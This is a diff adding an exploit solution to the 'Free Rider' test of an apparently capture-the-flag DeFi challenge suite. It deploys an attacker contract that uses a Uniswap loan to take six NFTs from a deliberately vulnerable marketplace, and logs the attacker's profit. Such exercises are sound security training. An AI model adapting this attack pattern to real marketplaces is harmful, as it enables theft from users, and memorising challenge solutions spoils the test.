@@ -5,6 +5,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const {BigNumber} = require("ethers");
 
 describe('[Challenge] Free Rider', function () {
     let deployer, attacker, buyer;
@@ -105,6 +106,34 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let attackerBalance = await ethers.provider.getBalance(attacker.address);
+        console.log("Attacker.balance = ", ethers.utils.formatEther(attackerBalance.toString()));
+
+        const attackerContract = await (await ethers.getContractFactory('FreeRiderAttacker', attacker))
+            .deploy(
+                this.uniswapPair.address,
+                this.marketplace.address,
+                this.buyerContract.address,
+                this.nft.address,
+                this.weth.address
+            );
+
+        // Put enough ETH in the attacker contract to pay for
+        // gas and the loan fee
+        (await attacker.sendTransaction({
+            to: await attackerContract.address,
+            value: ethers.utils.parseEther('.05') // should be enough for the loan fee
+        })).wait();
+        // Now, have the attacker contract _steal_ the NFTs
+        (await attackerContract.attack(NFT_PRICE, [0, 1, 2, 3, 4, 5])).wait();
+
+        const originalBalance = attackerBalance;
+        attackerBalance = await ethers.provider.getBalance(attacker.address);
+        console.log("Attacker.balance = ", {
+            attackerBalance: ethers.utils.formatEther(attackerBalance.toString()),
+            originalBalance: ethers.utils.formatEther(originalBalance.toString()),
+            profit: ethers.utils.formatEther((attackerBalance - originalBalance).toString())
+        });
     });
 
     after(async function () {
